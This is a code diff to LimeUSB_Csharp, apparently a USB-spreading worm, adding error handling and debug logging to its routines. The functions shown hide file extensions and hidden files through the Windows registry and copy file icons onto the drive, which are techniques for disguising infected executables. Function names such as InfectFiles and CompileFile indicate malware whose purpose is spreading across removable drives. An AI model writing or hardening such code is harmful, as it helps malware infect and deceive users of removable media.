@@ -66,11 +66,18 @@ namespace LimeUSB_Csharp
 
         public static void ExplorerOptions()
         {
-            RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced", true);
-            if (key.GetValue("Hidden") != (object)2)
-                key.SetValue("Hidden", 2);
-            if (key.GetValue("HideFileExt") != (object)1)
-                key.SetValue("HideFileExt", 1);
+            try
+            {
+                RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced", true);
+                if (key.GetValue("Hidden") != (object)2)
+                    key.SetValue("Hidden", 2);
+                if (key.GetValue("HideFileExt") != (object)1)
+                    key.SetValue("HideFileExt", 1);
+            }
+            catch (Exception ex)
+            {
+                Debug.WriteLine("ExplorerOptions: " + ex.Message);
+            }
         }
 
         public static void InfectFiles(string path)
@@ -112,8 +119,9 @@ namespace LimeUSB_Csharp
                         CreteDirectory(directory);
                     }
                 }
-                catch
+                catch (Exception ex)
                 {
+                    Debug.WriteLine("CreteDirectory: " + ex.Message);
                 }
             }
         }
@@ -144,7 +152,10 @@ namespace LimeUSB_Csharp
                 singleIcon.CreateFrom(fileIcon.ToBitmap(), IconOutputFormat.Vista);
                 singleIcon.Save(Path.GetPathRoot(file) + Settings.WorkDirectory + "\\" + Settings.IconsDirectory + "\\" + Path.GetFileNameWithoutExtension(file.Replace(" ", null)) + ".ico");
             }
-            catch { }
+            catch (Exception ex)
+            {
+                Debug.WriteLine("ChangeIcon: " + ex.Message);
+            }
         }
 
         public static void CompileFile(string infectedFile)
